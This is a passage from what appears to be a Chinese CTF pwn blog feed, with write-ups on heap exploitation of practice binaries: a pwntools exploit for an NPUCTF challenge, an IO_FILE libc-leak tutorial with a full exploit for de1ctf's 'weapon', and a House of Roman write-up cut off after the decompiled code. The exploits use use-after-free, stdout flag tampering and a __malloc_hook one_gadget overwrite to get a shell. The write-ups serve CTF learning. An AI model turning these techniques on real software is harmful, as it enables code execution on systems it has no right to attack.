<h4 id="exp如下：-3"><a href="#exp如下：-3" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;bad_guy&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;bad_guy&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(index,size,content) :</span><br><span class="line">	sh.recvuntil(&#39;&gt;&gt; &#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def edit(index,size,content) :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.send(content)</span><br><span class="line"></span><br><span class="line">def free(index) :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#libc_base&#x3D;0xa0d000</span><br><span class="line"></span><br><span class="line">add(0,0x10,&#39;L0ne1y&#39;)</span><br><span class="line">add(1,0x50,&#39;L0ne1y&#39;)</span><br><span class="line">add(2,0x60,&#39;L0ne1y&#39;)</span><br><span class="line">add(3,0x60,&#39;L0ne1y&#39;)</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">off_by_one&#x3D;&#39;a&#39;*0x10+p64(0)+p64(0xd1)</span><br><span class="line">edit(0,0x20,off_by_one)</span><br><span class="line">free(1)</span><br><span class="line">add(1,0x50,&#39;L0ne1y&#39;)</span><br><span class="line"></span><br><span class="line">edit(1,0x62,p64(0)*0xb+p64(0x71)+p16(0x25dd))</span><br><span class="line">add(2,0x60,&#39;L0ne1y&#39;)</span><br><span class="line">add(4,0x60,&#39;L0ne1y&#39;) #get fake_chunk</span><br><span class="line"></span><br><span class="line">edit(4,0x60,p64(0)*6+&#39;\x00&#39;*3+p64(0xfbad1800)+p64(0)*3+&#39;\x00&#39;) #get libc</span><br><span class="line">IO_stdder&#x3D;u64(sh.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))-192</span><br><span class="line">print (&#39;IO_stdder:&#39; +hex(IO_stdder))</span><br><span class="line"></span><br><span class="line">libc_base&#x3D;IO_stdder-libc.symbols[&#39;_IO_2_1_stderr_&#39;]</span><br><span class="line">print(&#39;libc_base:&#39; +hex(libc_base))</span><br><span class="line">one_gadget&#x3D;libc_base+0xf1147</span><br><span class="line">print(&#39;one_gadget:&#39; +hex(one_gadget))</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">edit(1,0x68,p64(0)*0xb+p64(0x71)+p64(libc_base+libc.symbols[&#39;__malloc_hook&#39;]-0x23))</span><br><span class="line">add(2,0x60,&#39;L0ne1y&#39;)</span><br><span class="line">add(5,0x60,&#39;a&#39;*0x13+p64(one_gadget))</span><br><span class="line">#edit(5,0x60,&#39;a&#39;*0x13+p64(one_gadget))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;&gt;&gt; &#39;)</span><br><span class="line">sh.sendline(&#39;1&#39;)</span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(str(6))</span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(str(32))</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="爆破脚本-1"><a href="#爆破脚本-1" class="headerlink" title="爆破脚本"></a>爆破脚本</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">for i in &#96;seq 1 20&#96;; do python exp.py; done;</span><br></pre></td></tr></table></figure>



<p>参考链接：<a href="https://www.cnblogs.com/Theffth-blog/p/12748295.html" target="_blank" rel="noopener external nofollow noreferrer">https://www.cnblogs.com/Theffth-blog/p/12748295.html</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>CTF Game</category>
      </categories>
      <tags>
        <tag>NPUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>IO_FILE泄露libc</title>
    <url>/2020/05/14/IO-FILE%E6%B3%84%E9%9C%B2libc/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/OlPgueqbNaCoMJh.png" alt="alt"></p>
<a id="more"></a>

<h3 id="FILE介绍（CTF-WIKI）"><a href="#FILE介绍（CTF-WIKI）" class="headerlink" title="FILE介绍（CTF WIKI）"></a>FILE介绍（CTF WIKI）</h3><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。</p>
<h3 id="学习心得"><a href="#学习心得" class="headerlink" title="学习心得"></a>学习心得</h3><p>因为遇到了程序没有类似show这样的函数，单纯的使用House of Roman这样的方法来getshell难度太大，所以就学习了一下IO流的知识，通过IO流来泄露libc。</p>
<p>主要思路就是修改stdout的flag位为<code>0xfbad1800</code>,并且将<code>_IO_write_base</code>的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址。</p>
<p>具体关于原理是怎么样的，我也不是太清楚，看了源码，只是了解了大概思路，太菜了我，啥都不会。</p>
<p>这里我使用一道例题来讲解一下如何利用io流来泄露libc。</p>
<h3 id="weapon-2019-de1ctf"><a href="#weapon-2019-de1ctf" class="headerlink" title="weapon_2019_de1ctf"></a>weapon_2019_de1ctf</h3><h4 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下："><a href="#main函数如下：" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; &#x2F;&#x2F; ST08_8@1</span><br><span class="line">  int v4; &#x2F;&#x2F; [sp+4h] [bp-Ch]@2</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stderr, 0LL, 2, 0LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_A50();</span><br><span class="line">    v4 &#x3D; sub_AAE();</span><br><span class="line">    switch ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        add();</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        free_();</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        edit();</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        puts(&quot;Incalid choice!&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add函数如下："><a href="#add函数如下：" class="headerlink" title="add函数如下："></a>add函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 add()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; &#x2F;&#x2F; rax@12</span><br><span class="line">  __int64 v1; &#x2F;&#x2F; rsi@12</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+8h] [bp-18h]@1</span><br><span class="line">  int v3; &#x2F;&#x2F; [sp+Ch] [bp-14h]@5</span><br><span class="line">  void *v4; &#x2F;&#x2F; [sp+10h] [bp-10h]@9</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;wlecome input your size of weapon: &quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%d&quot;, &amp;v2);</span><br><span class="line">  if ( v2 &lt;&#x3D; 0 || v2 &gt; 96 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;The size of weapon is too dangers!!&quot;, &amp;v2);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;input index: &quot;, &amp;v2);</span><br><span class="line">  v3 &#x3D; sub_AAE();</span><br><span class="line">  if ( v3 &lt; 0 &amp;&amp; v3 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;error&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 &#x3D; malloc(v2);</span><br><span class="line">  if ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;malloc error&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  dword_202068[4 * v3] &#x3D; v2;</span><br><span class="line">  *((_QWORD *)&amp;unk_202060 + 2 * v3) &#x3D; v4;</span><br><span class="line">  puts(&quot;input your name:&quot;);</span><br><span class="line">  sub_AF6(*((void **)&amp;unk_202060 + 2 * v3), v2);</span><br><span class="line">  result &#x3D; 0LL;</span><br><span class="line">  v1 &#x3D; *MK_FP(__FS__, 40LL) ^ v5;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="free函数如下："><a href="#free函数如下：" class="headerlink" title="free函数如下："></a>free函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 free_()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; &#x2F;&#x2F; [sp+4h] [bp-Ch]@1</span><br><span class="line">  __int64 v2; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;input idx :&quot;);</span><br><span class="line">  v1 &#x3D; sub_AAE();</span><br><span class="line">  if ( v1 &lt; 0 &amp;&amp; v1 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;error&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  free(*((void **)&amp;unk_202060 + 2 * v1));</span><br><span class="line">  puts(&quot;Done!&quot;);</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="edit函数如下："><a href="#edit函数如下：" class="headerlink" title="edit函数如下："></a>edit函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; &#x2F;&#x2F; [sp+4h] [bp-Ch]@1</span><br><span class="line">  __int64 v2; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;input idx: &quot;);</span><br><span class="line">  v1 &#x3D; sub_AAE();</span><br><span class="line">  if ( v1 &lt; 0 &amp;&amp; v1 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;error&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;new content:&quot;);</span><br><span class="line">  sub_AF6(*((void **)&amp;unk_202060 + 2 * v1), dword_202068[4 * v1]);</span><br><span class="line">  puts(&quot;Done !&quot;);</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到程序中没有类似于show这样的函数，而在free函数中我们发现了uaf漏洞。程序现在我们只能申请0–96大小的chunk。</p>
<h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><ol>
<li>申请3个0x60大小的chunk，在chunk0的数据段伪造chunk0的prev_size和size位，然后free掉chunk0和chunk1，利用uaf修改chunk1的fd为我们伪造的chunk0的地址，连续俩次将chunk1和fake_chunk0申请过来</li>
<li>通过fake_chunk0修改chunk1的size字节为0x91，然后free掉chunk1，此时chunk1进入unsorted bin ，通过fake_chunk0然后再修复chunk1的size为0x71，利用uaf修改fd低俩个字节为0x25dd，使地址变为<code>_IO_2_1_stderr_+157</code>，连续俩次将chunk1和<code>_IO_2_1_stderr_+157</code>为地址的fake_chunk申请下来</li>
<li>然后修改stdout的flag位为<code>0xfbad1800</code>和<code>_IO_write_base</code>的最后一个字节，接收libc地址。</li>
<li>此时unsorted中有一个0x71大小的chunk，我们申请下来，然后再free掉，利用uaf修改该chunk的fd为<code>malloc_hook-0x23</code>，然后连续malloc将其申请下来。</li>
<li>修改<code>malloc_hook</code>为one_gadget地址</li>
<li>随便malloc一次，来getshell。</li>
</ol>
<p>这里我贴一下<code>_IO_2_1_stdout_</code>结构体</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p _IO_2_1_stdout_</span><br><span class="line">$1 &#x3D; &#123;</span><br><span class="line">  file &#x3D; &#123;</span><br><span class="line">    _flags &#x3D; 0xfbad2887,  #0xfbad1800</span><br><span class="line">    _IO_read_ptr &#x3D; 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_end &#x3D; 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_base &#x3D; 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_base &#x3D; 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, &lt;----</span><br><span class="line">    _IO_write_ptr &#x3D; 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_end &#x3D; 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_base &#x3D; 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_end &#x3D; 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;, </span><br><span class="line">    _IO_save_base &#x3D; 0x0, </span><br><span class="line">    _IO_backup_base &#x3D; 0x0, </span><br><span class="line">    _IO_save_end &#x3D; 0x0, </span><br><span class="line">    _markers &#x3D; 0x0, </span><br><span class="line">    _chain &#x3D; 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;, </span><br><span class="line">    _fileno &#x3D; 0x1, </span><br><span class="line">    _flags2 &#x3D; 0x0, </span><br><span class="line">    _old_offset &#x3D; 0xffffffffffffffff, </span><br><span class="line">    _cur_column &#x3D; 0x0, </span><br><span class="line">    _vtable_offset &#x3D; 0x0, </span><br><span class="line">    _shortbuf &#x3D; &quot;\n&quot;, </span><br><span class="line">    _lock &#x3D; 0x7ffff7dd3780 &lt;_IO_stdfile_1_lock&gt;, </span><br><span class="line">    _offset &#x3D; 0xffffffffffffffff, </span><br><span class="line">    _codecvt &#x3D; 0x0, </span><br><span class="line">    _wide_data &#x3D; 0x7ffff7dd17a0 &lt;_IO_wide_data_1&gt;, </span><br><span class="line">    _freeres_list &#x3D; 0x0, </span><br><span class="line">    _freeres_buf &#x3D; 0x0, </span><br><span class="line">    __pad5 &#x3D; 0x0, </span><br><span class="line">    _mode &#x3D; 0xffffffff, </span><br><span class="line">    _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable &#x3D; 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;pwn&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(index,size,name) :</span><br><span class="line">	sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">	sh.send(name)</span><br><span class="line"></span><br><span class="line">def create(index,size,name) :</span><br><span class="line">        sh.sendline(&#39;1&#39;)</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(str(size))</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.send(name)</span><br><span class="line"></span><br><span class="line">def free(index) :</span><br><span class="line">	sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,rename) :</span><br><span class="line">        sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">        sh.send(rename)</span><br><span class="line"></span><br><span class="line">def edit1(index,rename) :</span><br><span class="line">        sh.recvuntil(&#39;\n&#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.send(rename)</span><br><span class="line"></span><br><span class="line">add(0,0x60,p64(0) + p64(0x71))</span><br><span class="line">add(1,0x60,p64(0) + p64(0x51))</span><br><span class="line">add(2,0x60,p64(0)*3 + p64(0x51))</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">edit(1,&#39;\x10&#39;)</span><br><span class="line">add(3,0x60,&#39;a&#39;)</span><br><span class="line"># delete(1)</span><br><span class="line"></span><br><span class="line">add(4,0x60,p64(0)*0xb + p64(0x71))</span><br><span class="line">free(3)</span><br><span class="line"></span><br><span class="line">edit(4,p64(0)*0xb + p64(0x91))</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">edit(4,p64(0)*0xb + p64(0x71))</span><br><span class="line">edit(3,&#39;\xdd\x25&#39;)</span><br><span class="line"></span><br><span class="line">add(5,0x60,&#39;a&#39;)</span><br><span class="line">add(6,0x60,p64(0)*6+&#39;\x00&#39;*3+p64(0xfbad1800)+p64(0)*3+&#39;\x00&#39;)</span><br><span class="line">IO_stderr &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))-192</span><br><span class="line">print (&#39;IO_stderr:&#39; +hex(IO_stderr))</span><br><span class="line">libc_base&#x3D;IO_stderr-libc.sym[&#39;_IO_2_1_stderr_&#39;]</span><br><span class="line">one_gadget&#x3D;0xf1147+libc_base</span><br><span class="line">print (&#39;one_gadget:&#39; +hex(one_gadget))</span><br><span class="line">malloc_hook &#x3D; libc_base + libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">fack_chunk &#x3D; malloc_hook - 0x23</span><br><span class="line"></span><br><span class="line">create(7,0x60,&#39;a&#39;)</span><br><span class="line">free(7)</span><br><span class="line">edit1(7,p64(fack_chunk))</span><br><span class="line">create(7,0x60,&#39;a&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x13+p64(one_gadget)</span><br><span class="line">create(8,0x60,payload)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;choice &gt;&gt; &quot;)</span><br><span class="line">sh.sendline(&#39;1&#39;)</span><br><span class="line">sh.recvuntil(&quot;weapon: &quot;)</span><br><span class="line">sh.sendline(&#39;32&#39;)</span><br><span class="line">sh.recvuntil(&quot;index: &quot;)</span><br><span class="line">sh.sendline(&#39;7&#39;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="爆破脚本："><a href="#爆破脚本：" class="headerlink" title="爆破脚本："></a>爆破脚本：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">for i in &#96;seq 1 20&#96;; do python exp.py; done;</span><br></pre></td></tr></table></figure>



<p>参考链接：</p>
<p><a href="https://n0va-scy.github.io/2019/09/21/IO_FILE/" target="_blank" rel="noopener external nofollow noreferrer">https://n0va-scy.github.io/2019/09/21/IO_FILE/</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/" target="_blank" rel="noopener external nofollow noreferrer">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/</a></p>
]]></content>
      <categories>
        <category>IO_FILE</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>House of Roman</title>
    <url>/2020/05/13/House-of-Roman/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/ABlMdTQ4JwDu9qY.png" alt="alt"></p>
<a id="more"></a>

<h3 id="介绍（CTF-WIKI）"><a href="#介绍（CTF-WIKI）" class="headerlink" title="介绍（CTF WIKI）"></a>介绍（CTF WIKI）</h3><p>House of Roman 这个技巧说简单点其实就是 fastbin attack 和 Unsortbin attack 结合的一个小 trick。House of Roman可以在开启了ALSR地址随机化的情况下，通过爆破12bit的方式来进行getshell，爆破概率为1/4096</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>程序中存在UAF或者能够达到修改fastbin的fd指针效果的漏洞</li>
<li>可以申请任意大小的chunk块</li>
</ul>
<p>以一道例题来了解House of Roman</p>
<h3 id="new-chall"><a href="#new-chall" class="headerlink" title="new_chall"></a>new_chall</h3><h4 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下"><a href="#main函数如下" class="headerlink" title="main函数如下:"></a>main函数如下:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; &#x2F;&#x2F; rdi@1</span><br><span class="line">  int v4; &#x2F;&#x2F; [sp+8h] [bp-8h]@2</span><br><span class="line">  int v5; &#x2F;&#x2F; [sp+Ch] [bp-4h]@3</span><br><span class="line"></span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(_bss_start, 0LL, 2, 0LL);</span><br><span class="line">  v3 &#x3D; stderr;</span><br><span class="line">  setvbuf(stderr, 0LL, 2, 0LL);</span><br><span class="line">  start_p(v3, 0LL);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    print_menu();</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v4);</span><br><span class="line">    switch ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        puts(&quot;Malloc&quot;);</span><br><span class="line">        v5 &#x3D; malloc_chunk();</span><br><span class="line">        if ( !v5 )</span><br><span class="line">          puts(&quot;Error&quot;);</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        puts(&quot;Write&quot;);</span><br><span class="line">        write_chunk();</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        puts(&quot;Free&quot;);</span><br><span class="line">        free_chunk();</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        puts(&quot;Invalid choice&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="malloc-chunk函数如下："><a href="#malloc-chunk函数如下：" class="headerlink" title="malloc_chunk函数如下："></a>malloc_chunk函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 malloc_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; &#x2F;&#x2F; rax@2</span><br><span class="line">  void *v1; &#x2F;&#x2F; rax@3</span><br><span class="line">  unsigned int v2; &#x2F;&#x2F; [sp+0h] [bp-10h]@1</span><br><span class="line">  size_t size; &#x2F;&#x2F; [sp+4h] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;Enter size of chunk :&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;size);</span><br><span class="line">  printf(&quot;Enter index :&quot;, &amp;size);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v2);</span><br><span class="line">  if ( v2 &lt;&#x3D; 0x13 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 &#x3D; malloc(size);</span><br><span class="line">    *(&amp;size + 4) &#x3D; v1;</span><br><span class="line">    heap_ptrs[v2] &#x3D; v1;</span><br><span class="line">    sizes[v2] &#x3D; size;</span><br><span class="line">    result &#x3D; *(&amp;size + 4);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Invalid index&quot;);</span><br><span class="line">    result &#x3D; 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="write-chunk函数如下："><a href="#write-chunk函数如下：" class="headerlink" title="write_chunk函数如下："></a>write_chunk函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int write_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  int result; &#x2F;&#x2F; eax@2</span><br><span class="line">  unsigned int v1; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+Ch] [bp-4h]@5</span><br><span class="line"></span><br><span class="line">  printf(&quot;\nEnter index of chunk :&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;&#x3D; 0x13 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( heap_ptrs[v1] )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 &#x3D; sizes[v1];</span><br><span class="line">      printf(&quot;Enter data :&quot;, &amp;v1);</span><br><span class="line">      result &#x3D; read(0, heap_ptrs[v1], v2 + 1);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      result &#x3D; puts(&quot;Bad index&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; puts(&quot;\nInvalid index&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure>

<h4 id="free-chunk函数如下："><a href="#free-chunk函数如下：" class="headerlink" title="free_chunk函数如下："></a>free_chunk函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void free_chunk()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; &#x2F;&#x2F; [sp+Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;\nEnter index :&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v0);</span><br><span class="line">  if ( v0 &lt;&#x3D; 0x13 )</span><br><span class="line">    free(heap_ptrs[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

